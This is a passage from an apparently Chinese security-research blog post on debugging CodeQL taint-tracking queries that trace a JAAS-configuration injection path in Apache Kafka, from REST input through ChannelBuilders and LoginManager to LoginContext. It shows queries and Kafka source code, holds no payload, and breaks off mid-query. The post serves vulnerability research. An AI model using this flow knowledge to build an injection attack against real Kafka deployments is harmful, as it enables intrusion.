class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次运行仍然无结果。</p><p>基本可以判断是SaslChannelBuilder#configure 这一步污点断了</p><h5 id="Confuse-1-1-2"><a href="#Confuse-1-1-2" class="headerlink" title="Confuse: 1+1 != 2"></a>Confuse: 1+1 != 2</h5><p>试试SaslChannelBuilder#configure 能否到 LoginManager#acquireLoginManager。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> JAASSource()&#123;</span><br><span class="line">     exists(Class c| </span><br><span class="line">         c.getAField() &#x3D; this.asExpr().(FieldAccess).getField()</span><br><span class="line">         and c.hasQualifiedName(&quot;org.apache.kafka.common.network&quot;, &quot;SaslChannelBuilder&quot;)</span><br><span class="line">         and this.asExpr().(FieldRead).getField().hasName(&quot;jaasContexts&quot;)</span><br><span class="line">     )</span><br><span class="line">     or</span><br><span class="line">     exists(</span><br><span class="line">         Method m | m.getParameter(0) &#x3D; this.asParameter() |</span><br><span class="line">         m.getDeclaringType().hasQualifiedName(&quot;org.apache.kafka.common.network&quot;, &quot;SaslChannelBuilder&quot;)</span><br><span class="line">         and m.hasName(&quot;configure&quot;)</span><br><span class="line">     )</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">     exists(</span><br><span class="line">         Method m | </span><br><span class="line">         m.getParameter(0) &#x3D; sink.asParameter()</span><br><span class="line">         and m.getDeclaringType().hasQualifiedName(&quot;org.apache.kafka.common.security.authenticator&quot;, &quot;LoginManager&quot;)</span><br><span class="line">         and m.hasName(&quot;acquireLoginManager&quot;)</span><br><span class="line">     )</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-607.png" alt="upload successful"></p><blockquote><p>疑问：SaslChannelBuilder#configure -&gt; LoginManager#acquireLoginManager -&gt; LoginContext(,,,configuration) 单步都可以，为什么合起来就不行？</p></blockquote><p>思路：</p><ol><li>排查当前合并起来不连通的问题</li><li>继续往上尝试</li></ol><h4 id="4-1-3-ChannelBuilders-create"><a href="#4-1-3-ChannelBuilders-create" class="headerlink" title="4.1.3 ChannelBuilders#create"></a>4.1.3 ChannelBuilders#create</h4><p>继续往上回溯一级，到ChannelBuilders#create，试试</p><h5 id="ChannelBuilders-create-gt-LoginContext-configuration"><a href="#ChannelBuilders-create-gt-LoginContext-configuration" class="headerlink" title="ChannelBuilders#create -&gt; LoginContext(,,,configuration)"></a>ChannelBuilders#create -&gt; LoginContext(,,,configuration)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">JAASSource()&#123;</span><br><span class="line">    exists(</span><br><span class="line">        Method m | m.getParameter(0) &#x3D; this.asParameter() |</span><br><span class="line">        m.getDeclaringType().hasQualifiedName(&quot;org.apache.kafka.common.network&quot;, &quot;SaslChannelBuilder&quot;)</span><br><span class="line">        and m.hasName(&quot;configure&quot;)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行无结果</p><h5 id="ChannelBuilders-create-gt-LoginManager-acquireLoginManager"><a href="#ChannelBuilders-create-gt-LoginManager-acquireLoginManager" class="headerlink" title="ChannelBuilders#create -&gt; LoginManager#acquireLoginManager"></a>ChannelBuilders#create -&gt; LoginManager#acquireLoginManager</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">private class JAASSource extends RemoteFlowSource &#123;</span><br><span class="line">    JAASSource()&#123;</span><br><span class="line">        exists(</span><br><span class="line">            Method m | </span><br><span class="line">            m.getParameter(3) &#x3D; this.asParameter()</span><br><span class="line">            and m.getDeclaringType().hasQualifiedName(&quot;org.apache.kafka.common.network&quot;, &quot;ChannelBuilders&quot;)</span><br><span class="line">            and m.hasName(&quot;create&quot;)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">    override string getSourceType() &#123; result &#x3D; &quot;jaas&quot; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">     VulConfig() &#123; this &#x3D; &quot;jaas vul&quot; &#125;</span><br><span class="line"></span><br><span class="line">     override predicate isSource(DataFlow::Node src) &#123; </span><br><span class="line">        src instanceof JAASSource</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">     override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        exists(</span><br><span class="line">            Method m | </span><br><span class="line">            m.getParameter(0) &#x3D; sink.asParameter()</span><br><span class="line">            and m.getDeclaringType().hasQualifiedName(&quot;org.apache.kafka.common.security.authenticator&quot;, &quot;LoginManager&quot;)</span><br><span class="line">            and m.hasName(&quot;acquireLoginManager&quot;)</span><br><span class="line">        )</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>运行也无果。</p><h3 id="4-2-Forward-Analysis"><a href="#4-2-Forward-Analysis" class="headerlink" title="4.2 Forward Analysis"></a>4.2 Forward Analysis</h3><p>换个思路，看看JAX-RS的污点能传到哪</p><h4 id="4-2-1-StandaloneHerder-createConnectorTasks"><a href="#4-2-1-StandaloneHerder-createConnectorTasks" class="headerlink" title="4.2.1 StandaloneHerder#createConnectorTasks"></a>4.2.1 StandaloneHerder#createConnectorTasks</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">JAASSource()&#123;</span><br><span class="line">    exists( </span><br><span class="line">        Method m, Annotation a | </span><br><span class="line">        m.getAParameter() &#x3D; this.asParameter()</span><br><span class="line">        and m.getFile().getAbsolutePath().matches(&quot;%ConnectorsResource.java&quot;)</span><br><span class="line">        and a.getType().hasQualifiedName(&quot;javax.ws.rs&quot;, &quot;Path&quot;)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists( </span><br><span class="line">        MethodAccess ma | </span><br><span class="line">        ma.getAnArgument() &#x3D; sink.asExpr()</span><br><span class="line">        and ma.getMethod().getDeclaringType().hasQualifiedName(&quot;org.apache.kafka.connect.runtime.standalone&quot;, &quot;StandaloneHerder&quot;)</span><br><span class="line">        and ma.getMethod().hasName(&quot;createConnectorTasks&quot;)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-608.png" alt="upload successful"></p><h4 id="4-2-2-StandaloneHerder-startTask"><a href="#4-2-2-StandaloneHerder-startTask" class="headerlink" title="4.2.2 StandaloneHerder#startTask"></a>4.2.2 StandaloneHerder#startTask</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists( </span><br><span class="line">        Method m | </span><br><span class="line">        m.getAParameter() &#x3D; sink.asParameter()</span><br><span class="line">        and m.getDeclaringType().hasQualifiedName(&quot;org.apache.kafka.connect.runtime.standalone&quot;, &quot;StandaloneHerder&quot;)</span><br><span class="line">        and m.hasName(&quot;startTask&quot;)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行无结果。</p><h2 id="0x05-Failed-Partial-Debug-Experience"><a href="#0x05-Failed-Partial-Debug-Experience" class="headerlink" title="0x05 Failed Partial Debug Experience"></a>0x05 Failed Partial Debug Experience</h2><p>总结下遇到的3个问题</p><ol><li>JAXRSWSSource 只能传播到StandaloneHerder#createConnectorTasks，但是到不了StandaloneHerder#startTask</li><li>LoginManager#acquireLoginManager可以到最终的sink LoginContext(,,,Configuration)，但是ChannelBuilders#create 到不了LoginManager#acquireLoginManager</li><li>SaslChannelBuilder 到不了LoginContext(,,,Configuration)，但是可以到LoginManager#acquireLoginManager</li></ol><p>针对问题2，用Codeql Debug 来定位具体传播断点。</p><h3 id="5-1-ChannelBuilders-create"><a href="#5-1-ChannelBuilders-create" class="headerlink" title="5.1 ChannelBuilders#create"></a>5.1 ChannelBuilders#create</h3><p><img src="/images/pasted-446.png" alt="upload successful"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> ChannelBuilder <span class="title">create</span><span class="params">(SecurityProtocol securityProtocol,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     Mode mode,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     JaasContext.Type contextType,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     AbstractConfig config,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     ListenerName listenerName,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     <span class="keyword">boolean</span> isInterBrokerListener,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     String clientSaslMechanism,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     <span class="keyword">boolean</span> saslHandshakeRequestEnable,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     CredentialCache credentialCache,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     DelegationTokenCache tokenCache,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     Time time,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     LogContext logContext,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     Supplier&lt;ApiVersionsResponse&gt; apiVersionSupplier)</span> </span>&#123;</span><br><span class="line">    Map&lt;String, Object&gt; configs = channelBuilderConfigs(config, listenerName);</span><br></pre></td></tr></table></figure><blockquote><p>结论：没有走出channelBuilderConfigs？</p></blockquote><p>channelBuilderConfigs<br><img src="/images/pasted-447.png" alt="upload successful"></p><p>valuesWithPrefixOverride<br><img src="/images/pasted-594.png" alt="upload successful"></p><p>疑点</p><ol><li>valuesWithPrefixOverride 是当作map的一个元素，是否能够继续污点传播</li><li>config entryset filter 这种语法，是否还能够支持。</li></ol><h3 id="5-2-补充channelBuilderConfigs"><a href="#5-2-补充channelBuilderConfigs" class="headerlink" title="5.2 补充channelBuilderConfigs"></a>5.2 补充channelBuilderConfigs</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">override predicate isAdditionalTaintStep(DataFlow::Node fromNode, DataFlow::Node toNode) &#123;</span><br><span class="line">    exists( MethodAccess ma| </span><br><span class="line">        ma &#x3D; toNode.asExpr()</span><br><span class="line">        and ma.getArgument(0) &#x3D; fromNode.asExpr()</span><br><span class="line">        and ma.getMethod().hasName(&quot;channelBuilderConfigs&quot;)</span><br><span class="line">        and ma.getFile().getBaseName() &#x3D; &quot;ChannelBuilders.java&quot;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现还是不行</p><h3 id="5-3-Partial-Debug-Again"><a href="#5-3-Partial-Debug-Again" class="headerlink" title="5.3 Partial Debug Again"></a>5.3 Partial Debug Again</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">predicate isSource(DataFlow::Node source) &#123; </span><br><span class="line">    &#x2F;&#x2F; ChannelBuilders#create config 参数能传播到哪</span><br><span class="line">    &#x2F;&#x2F; exists( </span><br><span class="line">    &#x2F;&#x2F;     MethodAccess ma | </span><br><span class="line">    &#x2F;&#x2F;     ma.getMethod().getParameter(3) &#x3D; source.asParameter()</span><br><span class="line">    &#x2F;&#x2F;     and ma.getMethod().getDeclaringType().hasQualifiedName(&quot;org.apache.kafka.common.network&quot;, &quot;ChannelBuilders&quot;)</span><br><span class="line">    &#x2F;&#x2F;     and ma.getMethod().hasName(&quot;create&quot;)</span><br><span class="line">    &#x2F;&#x2F; )</span><br><span class="line">    &#x2F;&#x2F; 这次以channelBuilderConfigs 返回为起点</span><br><span class="line">    exists( </span><br><span class="line">        MethodAccess ma | </span><br><span class="line">        ma &#x3D; source.asExpr()</span><br><span class="line">        and ma.getMethod().getDeclaringType().hasQualifiedName(&quot;org.apache.kafka.common.network&quot;, &quot;ChannelBuilders&quot;)</span><br><span class="line">        and ma.getMethod().hasName(&quot;channelBuilderConfigs&quot;)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#x2F;&#x2F; Partial Debug 结果太多，加些过滤条件</span><br><span class="line">predicate isBarrier(DataFlow::Node node)&#123;</span><br><span class="line">    exists( MethodAccess ma|</span><br><span class="line">        ma &#x3D; node.asExpr()</span><br><span class="line">        and ma.getLocation().getFile().getRelativePath().matches(&quot;%&#x2F;src&#x2F;test&#x2F;%&quot;)</span><br><span class="line">    )</span><br><span class="line">    or exists( </span><br><span class="line">        Method m| </span><br><span class="line">        m.getParameter(3) &#x3D; node.asParameter()</span><br><span class="line">        and m.hasName(&quot;acquireLoginManager&quot;)</span><br><span class="line">        and node.asParameter().hasName(&quot;configs&quot;)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现并未传播至jaasContext<br><img src="/images/pasted-595.png" alt="upload successful"></p><h3 id="5-4-ChannelBuilders-create-gt-LoginManager-acquireLoginManager"><a href="#5-4-ChannelBuilders-create-gt-LoginManager-acquireLoginManager" class="headerlink" title="5.4 ChannelBuilders#create -&gt; LoginManager#acquireLoginManager"></a>5.4 ChannelBuilders#create -&gt; LoginManager#acquireLoginManager</h3><p>isAdditionalTaintStep 继续加上loadServerContext</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> *&#x2F;</span><br><span class="line">import java</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line"></span><br><span class="line">private class JAASSource extends RemoteFlowSource &#123;</span><br><span class="line">    JAASSource()&#123;</span><br><span class="line">        exists( </span><br><span class="line">            MethodAccess ma | </span><br><span class="line">            ma.getMethod().getParameter(3) &#x3D; this.asParameter()</span><br><span class="line">            and ma.getMethod().getDeclaringType().hasQualifiedName(&quot;org.apache.kafka.common.network&quot;, &quot;ChannelBuilders&quot;)</span><br><span class="line">            and ma.getMethod().hasName(&quot;create&quot;)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">    override string getSourceType() &#123; result &#x3D; &quot;jaas&quot; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    VulConfig() &#123; this &#x3D; &quot;jaas vul&quot; &#125;</span><br><span class="line"> </span><br><span class="line">    override predicate isSource(DataFlow::Node src) &#123; src instanceof JAASSource &#125;</span><br><span class="line"> </span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        exists(</span><br><span class="line">            Method m | </span><br><span class="line">            m.getParameter(0) &#x3D; sink.asParameter()</span><br><span class="line">            and m.getDeclaringType*().hasQualifiedName(&quot;org.apache.kafka.common.security.authenticator&quot;, &quot;LoginManager&quot;)</span><br><span class="line">            and m.hasName(&quot;acquireLoginManager&quot;)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isAdditionalTaintStep(DataFlow::Node fromNode, DataFlow::Node toNode) &#123;</span><br><span class="line">        exists( MethodAccess ma| </span><br><span class="line">            ma &#x3D; toNode.asExpr()</span><br><span class="line">            and ma.getArgument(0) &#x3D; fromNode.asExpr()</span><br><span class="line">            and ma.getMethod().hasName(&quot;channelBuilderConfigs&quot;)</span><br><span class="line">            and ma.getFile().getBaseName() &#x3D; &quot;ChannelBuilders.java&quot;</span><br><span class="line">        )</span><br><span class="line">        or </span><br><span class="line">        exists(</span><br><span class="line">            MethodAccess ma|</span><br><span class="line">            ma &#x3D; toNode.asExpr()</span><br><span class="line">            and ma.getArgument(2) &#x3D; fromNode.asExpr()</span><br><span class="line">            and ma.getMethod().hasName(&quot;loadServerContext&quot;)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink, &quot;$@.&quot;, source.getNode(), &quot;user input&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-609.png" alt="upload successful"></p><p>虽然走通了ChannelBuilders#create -&gt; LoginManager#acquireLoginManager，但是还存在问题</p><ul><li>事后发现拿掉isAdditionalTaintStep条件1channelBuilderConfigs也行</li><li>后续到LoginContext(,,,Configuration) 还是不能串起来</li></ul><p>结论：</p><ul><li>Partial Debug结果不可全信</li></ul><h2 id="0x06-“Dumb”-Way-to-Debug"><a href="#0x06-“Dumb”-Way-to-Debug" class="headerlink" title="0x06 “Dumb” Way to Debug"></a>0x06 “Dumb” Way to Debug</h2><p>除以上Partial Debug 结果不全的结论外，其搜索结果如果不加限制，在这个case上sarif 结果动则上G，搜索也困难，改用Expr.getLocation().getFile() 限制sink 所属文件进行尝试。</p><h3 id="6-1-Sink-Expr-in-JaasContext"><a href="#6-1-Sink-Expr-in-JaasContext" class="headerlink" title="6.1 Sink Expr in JaasContext"></a>6.1 Sink Expr in JaasContext</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">JAASSource()&#123;</span><br><span class="line">    exists( </span><br><span class="line">        MethodAccess ma | </span><br><span class="line">        ma.getMethod().getParameter(3) &#x3D; this.asParameter()</span><br><span class="line">        and ma.getMethod().getDeclaringType().hasQualifiedName(&quot;org.apache.kafka.common.network&quot;, &quot;ChannelBuilders&quot;)</span><br><span class="line">        and ma.getMethod().hasName(&quot;create&quot;)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line">override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    sink.asExpr().getLocation().getFile().getRelativePath().matches(&quot;%JaasContext.java&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-610.png" alt="upload successful"></p><ul><li>可以看到，没有用isAdditionalTaintStep，就可以到JaasConfig</li></ul><blockquote><p>注意：实际污点应该是configuration，而不是dynamicJaasConfig</p></blockquote><h3 id="6-2-Discovery-StreamTokenizer"><a href="#6-2-Discovery-StreamTokenizer" class="headerlink" title="6.2 Discovery: StreamTokenizer"></a>6.2 Discovery: StreamTokenizer</h3><p><img src="/images/pasted-612.png" alt="upload successful"></p><p><img src="/images/pasted-611.png" alt="upload successful"></p><p>发现：</p><ul><li>dynamicJaasConfig已经被打标成污点</li><li>但是实际的污点JaasContext#configuration 并未被打标成污点</li><li>只隔了一条语句：<code>new JaasConfig(globalContextName, dynamicJaasConfig.value());</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">JaasConfig</span><span class="params">(String loginContextName, String jaasConfigParams)</span> </span>&#123;</span><br><span class="line">    StreamTokenizer tokenizer = <span class="keyword">new</span> StreamTokenizer(<span class="keyword">new</span> StringReader(jaasConfigParams));</span><br><span class="line">    tokenizer.slashSlashComments(<span class="keyword">true</span>);</span><br><span class="line">    tokenizer.slashStarComments(<span class="keyword">true</span>);</span><br><span class="line">    tokenizer.wordChars(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">    tokenizer.wordChars(<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">    tokenizer.wordChars(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;$&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        configEntries = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (tokenizer.nextToken() != StreamTokenizer.TT_EOF) &#123;</span><br><span class="line">            configEntries.add(parseAppConfigurationEntry(tokenizer));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (configEntries.isEmpty())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Login module not specified in JAAS config&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.loginContextName = loginContextName;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> KafkaException(<span class="string">&quot;Unexpected exception while parsing JAAS config&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续看看，将JaasConfig作为sink文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sink.asExpr().getLocation().getFile().getRelativePath().matches(&quot;%JaasConfig.java&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/pasted-613.png" alt="upload successful"></p><p>到这里发现tokenizer 没有被污染，StringReader 不大可能，基本可以定位是StreamTokenizer 的问题。</p><h4 id="6-2-3-Add-StreamTokenizer-Support"><a href="#6-2-3-Add-StreamTokenizer-Support" class="headerlink" title="6.2.3 Add StreamTokenizer Support"></a>6.2.3 Add StreamTokenizer Support</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">override predicate isAdditionalTaintStep(DataFlow::Node fromNode, DataFlow::Node toNode) &#123;</span><br><span class="line">    exists(ConstructorCall cc |</span><br><span class="line">        cc.getAnArgument() &#x3D; fromNode.asExpr()</span><br><span class="line">        and cc &#x3D; toNode.asExpr()</span><br><span class="line">        and cc.getConstructor().getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;StreamTokenizer&quot;)</span><br><span class="line">    )</span><br><span class="line">    or </span><br><span class="line">    exists(VarAccess va, ClassOrInterface ci |</span><br><span class="line">        va.getQualifier().getType().getFile() &#x3D; ci.getFile()</span><br><span class="line">        and ci.getAField().hasName(&quot;sval&quot;)</span><br><span class="line">        and ci.hasName(&quot;StreamTokenizer&quot;)</span><br><span class="line">        and va.getVariable().hasName(&quot;sval&quot;)</span><br><span class="line">        and va &#x3D; toNode.asExpr()</span><br><span class="line">        and va.getQualifier() &#x3D; fromNode.asExpr()</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>继续排查，发现在这里断掉了</p><p><img src="/images/pasted-614.png" alt="upload successful"></p><h4 id="6-2-4-Add-AppConfigurationEntry-Support"><a href="#6-2-4-Add-AppConfigurationEntry-Support" class="headerlink" title="6.2.4 Add AppConfigurationEntry Support"></a>6.2.4 Add AppConfigurationEntry Support</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> override predicate isAdditionalTaintStep(DataFlow::Node fromNode, DataFlow::Node toNode) &#123;</span><br><span class="line">     exists(ConstructorCall cc |</span><br><span class="line">         cc.getAnArgument() &#x3D; fromNode.asExpr()</span><br><span class="line">         and cc &#x3D; toNode.asExpr()</span><br><span class="line">         and cc.getConstructor().getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;StreamTokenizer&quot;)</span><br><span class="line">     )</span><br><span class="line">     or </span><br><span class="line">     exists(VarAccess va, ClassOrInterface ci |</span><br><span class="line">         va.getQualifier().getType().getFile() &#x3D; ci.getFile()</span><br><span class="line">         and ci.getAField().hasName(&quot;sval&quot;)</span><br><span class="line">         and ci.hasName(&quot;StreamTokenizer&quot;)</span><br><span class="line">         and va.getVariable().hasName(&quot;sval&quot;)</span><br><span class="line">         and va &#x3D; toNode.asExpr()</span><br><span class="line">         and va.getQualifier() &#x3D; fromNode.asExpr()</span><br><span class="line">     )</span><br><span class="line">     or </span><br><span class="line">     exists(ConstructorCall cc |</span><br><span class="line">         cc.getAnArgument() &#x3D; 